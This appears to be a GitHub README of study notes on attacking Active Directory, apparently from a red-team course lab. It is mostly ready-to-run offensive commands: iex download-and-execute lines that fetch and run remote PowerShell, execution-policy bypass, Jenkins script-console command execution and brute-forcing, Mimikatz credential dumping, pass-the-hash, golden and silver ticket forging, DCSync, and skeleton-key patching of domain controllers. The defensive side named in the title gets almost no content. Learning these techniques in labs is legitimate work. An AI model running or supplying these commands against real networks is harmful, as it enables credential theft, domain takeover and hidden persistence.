<div align="center">
<h1> Attacking and Defending Active Directory :nepal: </h1>
<a href="https://twitter.com/nirajkharel7" ><img src="https://img.shields.io/twitter/follow/nirajkharel7?style=social" /> </a>
</div>

## Domain Enumeration Part 1
- The enumeration can be done by using Native executables and .NET classes
- `$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]`
- `$ADClass::GetCurrentDomain()`
- Where `DirectoryServices.ActiveDirectory.Domain` is a class and `GetCurrentDomain()` is a static method.

**Domain Enumeration with Powerview and AD PowerShell module**
- To speed up things we can use Powerview:
- `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`

- The Active Directory PowerShell module
- `https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps`
- `https://github.com/samratashok/ADModule`
- (To use ActiveDirectory module without installing RSAT, we can use Import-Module for the valid ActiveDirectory module DLL)

**Run unrestricted commands with powershell**
- `powershell -ep bypass`
- **Powerview Script Download**
- `iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/PowerView.ps1')`
- **ActiveDirectory Module Download**
- `https://github.com/samratashok/ADModule` Download and Execute with `. .\Import-ActiveDirectory.ps1;Import-ActiveDirectory`
-  or
- `iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory `

**Get Current Domain**
- `Get-NetDomain` (Powerview)
- `Get-ADDomain` (ActiveDirectory Module)

**Get object of another domain**
- `Get-NetDomain -Domain <domain-name>`
- `Get-ADDomain -Identity <domain-name>`

**Get Domain SID for the current domain**
- `Get-DomainSID`
- `(Get-ADDomain).DomainSID`

**Get domain policy for the current domain**
- `Get-DomainPolicy`
- `(Get-DomainPolicy)."system acccess"`

**Get domain policy for another domain**
- `(Get-DomainPolicy -domain moneycorp.local)".system access"`

**Get domain controllers for the current domain**
- `Get-NetDomainController`
- `Get-ADDomainController`

**Get domain controllers for another domain**
- `Get-NetDomainController -Domain <domain-name>`
- `Get-ADDomainController -DomainName <domain-name> -Discover`

**Get a list of users in the current domain**
- `Get-NetUser`
- `Get-NetUser -Username <username>`
- `Get-ADUser -Filter * -Properties *`
- `Get-ADUser -Identity <username> -Properties *`

**Get list of all properties for users in the current domain**
- `Get-UserProperty`
- `Get-UserProperty -Properties pwlastset`
- `Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name`
- `Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}`

**Search for a particular string in a user's attributes**
- `Find-UserField -SearchField Description`
- `Find-UserField -SearchField Description -SearchTerm "built"`
- `Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description`

## Domain Enumeration Part 2
**Get a list of computers in the current domain**
- `Get-NetComputer`
- `Get-NetComputer -OperatingSystem "*Server 2016"`
- `Get-NetComputer -Ping`
- `Get-NetComputer -FullData`
- `Get-ADComputer -Filter *`
- `Get-ADComputer -Filter * | select Name`

**Get all the groups in the current domain**
- `Get-NetGroup`
- `Get-NetGroup -Domain <targetDomain>`
- `Get-NetGroup -FullData`
- `Get-ADGroup -Filter * | select name`
- `Get-ADGroup -Filter * -Properties *`

**Get all groups containing the word "admin" in group name**
- `Get-NetGroup -GroupName *admin*`
- `Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`

**Get all the members of the Domain Admins Group**
- `Get-NetGroupMember -GroupName "Domain Admins" -Recurse`
- `Get-ADGroupMember -Identity "Domain Admins" -Recursive`

**Get the group membership for a user**
- `Get-NetGroup -Username "student1"`
- `Get-ADPrincipalGroupMembership -Identity student1`

**List all the local groups on a machine (needs administrator privs on non-dc machines**
- `Get-NetLocalGroup -ComputerName dcorp-dc.dollarccorp.moneycorp.local -ListGroups`

**Get members of all the local groups on a machine (needs administrator privs o non-dc machines)**
- `Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse`

**Get actively logged users on a computer (needs local admin rights on the target)**
- `Get-NetLoggedon -ComputerName <servername>`

**Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)**
- `Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local`

**Get the last logged user on a computer (needs administrative rights and remote registry on the target)**
- `Get-LastLoggedOn -ComputerName <servername>`

**Find shares on hosts in current domain**
- `Invoke-ShareFinder -Verbose`

**Find sensitive files on computer in the domain**
- `Invoke-FileFinder -Verbose`

**Get all fileservers of the domain**
- `Get-NetFileServer`

## Domain Enumeration Part 3
**Domain Enumeration - GPO**
- Group Policy provides the ability to manage configuration and changes easily and centrally in AD.
- Allows configuration of
  - Security Settings
  - Registry-based policy settings
  - Group policy preferences like startup/shutdown/log-on/logogg scripts settings
  - Software installation
- GPO can be abused for various attacks like privesc, backdoors, persistence etc.

**Get list of GPO in current domain**
- `Get-NetGPO`
- `Get-NetGPO | select displayname`
- `Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local`
- `Get-GPO -All` (GroupPolicy module)
- `Get-GPResultantSetofPolicy -ReportType Html -Path C:\Users\Administrator\report.html` (Provides RSoP)

**Get GPO(s) which use Restricted Groups or groups.xml for interesting users**
- `Get-NetGPOGroup`

**Access Control Model**
- Enables control on the ability of a process to access objects and other resources in active directory based on:
  - Access Tokens (security context of a process - identity and privs of user)
  - Security Descriptors (SID of the owner, Discretionary ACL (DACL)and System ACL (SACL))

**Access Control List (ACL)**
- It is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits access. Who has permission and what can be done on an objecct?
- Two types:
  - DACL : Defines the permissions trustees (a user or group) have on an object.
  - SACL : Logs success and failure audit messages when an objecct is accessed.
- ACLs are vital to security architecture of AD.

**Get the ACLs associated with the specified object**
- `Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs`

**Get the ACLs associated with the specific prefix to be used for search**
- `Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose`

**We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs**
- `(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access`

**Get the ACLs associated with the specific LDAP path to be used for search**
- `Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDS -Verbose`

**Search for interesting ACEs**
- `Invoke-ACLScanner -ResolveGUIDs`

**Get the ACLs associated with the specified path**
- `Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"`


## Domain Enumeration Part 4 - Trusts
**Get a list of all domain trusts for the current domain**
- `Get-NetDomainTrust`
- `Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local`
- `Get-ADTrust`
- `Get-ADTrust -Identity us.dollarcorp.moneycorp.local`

**Get details about the current forest**
- `Get-NetForest`
- `Get-NetForest -Forest eurocorp.local`
- `Get-ADForest`
- `Get-ADForest -Identity eurocorp.local`

**Get all domains in the current forest**
- `Get-NetForestDomain`
- `Get-NetForestDomain -Forest eurocorp.local`
- `(Get-ADForest).Domains`

**Get all global cataogs for the current forest**
- `Get-NetForestCatalog`
- `Get-NetForestCatalog -Forest eurocorp.local`
- `Get-ADForest | select -ExpandProperty GlobalCatalogs`

**Map trusts of a forest**
- `Get-NetForestTrust`
- `Get-NetForestTrust -Forest eurocorp.local`
- `Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'`

**Find all machines on the current domain where the current user has local admin access**
- `Find-LocalAdminAccess -Verbose`
- This function queries the DC of the current or provided domain for a list of computers `(Get-NetComputer)` and then use multi-threaded `Invoke-CheckLocalAdminAccess` on each machine.
- This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked. `Find-WMILocalAdminAccess.ps1`

**Find local admins on all machines of the domain (needs administrator privs on non-dc machines)**
- `Invoke-EnumerateLocalAdmin -Verbose`
- This function queries the DC of the current or provided domain for a list of computers `(Get-NetComputer)` and then use multi-threaded `Get-NetLocalGroup` on each machine.


## Local Privilege Escalation Part I
**In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following**
 - Hunting for Local Admin access on other machines.
 - Hunting for high privlege domain accounts (like a Domain Administrator)

**There are various ways of locally escalating privileges on Windows box:**
 - Missing patches
 - Automated deployment and AutoLogon passwords in clear text.
 - AlaysInstallElevated (Any user can run MSI as SYSTEM)
 - Misconfigured Services
 - DLL Hijacking and more

**We can use below tools for complete coverage**
 - PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 - BeRoot : https://github.com/AlessandroZ/BeRoot
 - Privesc : https://github.com/enjoiz/Privesc

**Services Issues using PowerUp**
- Get services with unquoted paths and a space in their name
  - `Get-ServiceUnquoted -Verbose`
  - If the path is unquoted under the root directory which means `C:/Tes File/test/test.exe`, we cannot perform this privilege escalation method because to drop an executable under the C:/ Path, we need to be administrator already.
  - Also the service should have `StartName : LocalSystem` and `CanRestart : True` functionalities
- Get services where the current user can write to its binary path or change arguments to the binary
  - `Get-ModifiableServiceFile -Verbose`
- Get the services whose configuration current user can modify.
  - `Get-ModifiableService -Verbose`

**Run all checks from:**
- PowerUp : `Invoke-AllChecks`
- BeRoot is an executable : '.\beRoot.exe'
- Priesc : `Invoke-PrivEsc`
 
## Local Privilege Escalation Part 2
**Feature Abuse**
- What we have been doing up to now (and will keep doing further in this calss) is relying on feature abuse.
- Features abuse are awesome as there are seldom patches for them and they are not the focus of security teams!
- One of my favourite features abuse is targeting enterprise applications which are not built keeping security in mind.
- On windows, many enterprise applications need either Administrative privileges or SYSTEM privileges maing them a great avenue for privilege escalation.

**Feature Abuse - Jenkins I**
- Jenkins is a widely used Continuous Integration tool.
- There are many interesting aspects with Jenkings but for now we would limit our discussion to the ability of running system commands on Jenkins.
- On a windows machine, a jenkins master or jenkins slave needs at least local admin privilege to operate.
- Login into the Jenkins. The user should be admin. We can do brute force attack for this. Jenkins does not have rate limit or passwod policy which means user can have any length for password and does not disturb the service when brute force is attempted.
- Apart from numerous plugins, there are two ways of executing commands on a Jenkins Master.
- If you have Admin access (default installation before 2.x), go to `http://<jenkins_server>/script/console`
- In the script console, Groovy scripts could be executed
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $err"
```

**Feature Abuse - Jenkins II**
- If you don't have admin access but could add or edit build steps in build configuration. Add a build step, and "Execute Windows Batch Command" and enter:
- `powershell -c <command>`
- Again, you could download and execute scripts, run encoded scripts and more.
- To verify if the user is on administrator group or not.
- `powershell -c whoami`
- `powershell net localgroup administrators`

## Domain Enumeration Bloodhound
- Provides GUI for AD entities and relationships for the data collected by its ingestors.
- Uses Graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins.
- https://github.com/BloodHoundAD/BloodHound
- There are built-in queries for frequently used actions.
- Also supports custom Cypher queries.

**Ingestors**
- Supply data to BloodHound:
  - `C:\AD\Tools\BloodHound-master\Ingestors\SharpHound.ps1`
  - `Invoke-BloodHound -CollectionMethod All`
- The generated archive can be uploaded to the BloodHound application.
- To avoid detections like ATA
  - `Invoke-BloodHound -CollectionMethod All -ExcludeDC`

## Lateral Movement
**PowerShell Remoting**
- Think of it as a psexec on steriods.
- You will found this inceasingly used in enterprises. Enabled by default on Server 2012 onwards.
- You may need to enable remote (Enable-PSRemoting) on a Desktop Windows machine, Admin privs are required to do that.
- You get elevated shell on remote system if admin creds are used to authenticate(which is the default setting).

**PowerShell Remoting One-to-One**
- It works over a session called PSSession
- PSSession
  - Interactive
  - Runs in a new process (wsmprovhost)
  - Is Stateful
- Useful cmdlets
  - `New-PSSession`
  - `Enter-PSSession`
  - We can use `New-PSSession` or `Enter-PSSession` to get access to a remote machine using PowerShell remoting.
  - We need local administrator privilege or administrator privilege onto target machine(computer), which means the account which we have compromised should have local administraor or administrator privlege on the target machine.
  - `. .\PowerView.ps1`
  - View the computers which we have local admin access on : `Find-LocalAdminAccess`
  - `Enter-PSSession -ComputerName <computer-name><domain-name>`
  - `whoami`
  - `whomai /priv` : To view the privileges information.

**PowerShell Remoting One-to-Many**
- Also known as Fan-out remoting.
- Non-interactive
- Executes command parallely
- Useful cmdlets
  - `Invoke-Command`
- Run commands and scripts on
  - multiple remote computers
  - in disconnected sessions (v3)
  - as background job and more
- The best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers
- Use `-Credential` parameter to pass username/password.
- Use below to execute commands or scriptblocks:
  - `Invoke-Command -Scriptblock{Get-Process} -ComputerName (Get-Content <list_of_servers>)`
- Use below to execute scripts from files
  - `Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)`
- Use below to execute locally loaded function on the remote machines:
  - `Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content <list_of_servers>)`
- In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
  - `Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList`
- In below, a functional call within the script is used:
  - `Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)` 
- Use below to execute "Stateful" commands using Invoke-Command
  - `$Sess = New-PSSession -ComputerName Server1`
  - `Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}`
  - `Invoke-Command -Session -Session $Sess -ScriptBlock {$Proc.Name}`
- More Informations
  - The script could be used to dump credentials, tickets and more using mimikatz with PowerShell without dropping the mimikatz exe to disk.
  - It is very useful for passing and replaying hashes, tickets and for many exciting Active Directory Attacks.
  - Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this scipt.
  - The script needs administrative privileges for dumping credentials from local machines. Many attacks need specific privileges which are covered while discussing that attack.

**Invoke Mimikatz**
- Dump credentials on a local machine
  - `Invoke-Mimikatz -DumpCreds`
- Dump credentials on multiple remote machines
  - `Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")`
- Invoke-Mimikatz uses PowerShell remoting cmdlet `Invoke-Command` to do above.
- "Over pass the hash" generate tokens from hashes. (Write the hashes)
  - Over pass the hash creates a valid kerberos ticket of using NTLM hash of a user.
  - `Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe"'`
  
## Domain Persistence Part 1
- There is much more to Active Directory than "just" the Domain Admin.
- Once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up!
- Let's have a look at abusing trust within domain, across domains and forests and various attacks on Kerberos.
- Kerberos is the basis of authentication in a Windows Active Directory environment.
- It has been constantly attacked since it was implemented with new attacks and scrutiny every couple of years.

**Kerberos**
- NTLM password hash for kerberos RC4 encryption.
- Logon Ticket (TGT) provides user auth to DC.
- Kerberos policy only checked when TGT is created.
- DC validates user account only when TGT > 20 mins.
- Service Ticket (TGS) PAC validation is optional & rare.
  - Server LSASS sends PAC validation request to DC's netlogon service (NRPC)
  - If it runs as a service, PAC validation is optional (disabled).
  - If a service runs as System, it performs server signature verification on the PAC (computer account long-term key).

**Persistence - Golden Ticket**
- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
- Since user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even deleted/revoked accounts.
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
- Password change has no effect on this attack.

**Execute mimikatz on DC as Domain Admin privileges to get krbtgt hash**
- `Invoke-Mimikatz -Command '"lsadump::lsa" /patch -Computername dcorp-dc'`

**On any machine**
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:<sid> /krbtgt:<krbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges:
- `Invoke-Mimikatz -Command '"lsadump::dcysnc /user:dcorp\krbtgt"'`

- Using the DCSync options needs no code execution (no need to run Invoke-Mimikatz) on the target DC.

## Domain Persistence Part 2
**Persistence - Silver Ticket**
- If we have access to this NTLM hash of the service account password, we can force TGS and present it to the application server. This is what a Silver Ticket attack defines.
- Silver Ticket is a valid TGS (Golden Ticket is TGT)
- Encrypted and Signed by the NTLM hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
- Services rarely check PAC (Privileged Attribute Certificate)
- Reasonable persistence period (default 30 days for computer accounts)

- Silver Ticket let us pretend we're domain admin to one specific service.
- We need perform kerberoasting attack in order to get the hash.
- Crack the hash with hashcat, so that we will get the credential of the service account.
- Convert that password in RC4 format using hashcat.
- Get the SID of the domain.
- Attackkkkkk
- We can also use **rubeus** for this attack.
  - `rubeus.exe silver /service:MSSQLSvc/kerbdc1.kerb.local:1433 /rc4:<RC4 hash> /sid:<SID of Domain> /user:Administrator /domain:kerb.local /ptt`
  - Ticket will be successfully imported.
  - `klist`
  - It will show that it is a Administrator but only for the service MSSQL.
  - `sqlcmd -S kerbdc1.kerb.local`
  - `SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser`
  - `GO`
  - We can see that we are an administrator on the SQL Server and we got access to all the SQL databases
- We can also use **mimikatz** for this attack.
  - Dump the RC4 hash
  - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DomainControllerPCName>`
  - `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:<SID> /target:dcorp-dc-dollarcorp.moneycorp.local /service:MSSQLSvc /rc4:<RC4-Hash> /user:Administrator /ptt"'`
  - `klist`
  - Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS, WSMAN and many more

**Persistence - Skeleton Key**
- Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
- The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
- All the publicly known methods are NOT persistent across reboots.
- Yet again, mimikatz to the rescue.
- Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA priviles required.
- `Invoke-Mimikatz -Command '"privilege::debug" "misc:skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local`
- Now, it is possible to access any machine with a valid username and password as `mimikatz`
- `Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator`
- You can access other machines as well as long as they authenticate with the DC which has been patched and the DC is not rebooted.

## Domain Persistence Part 3
- DSRM is Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After alterting the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
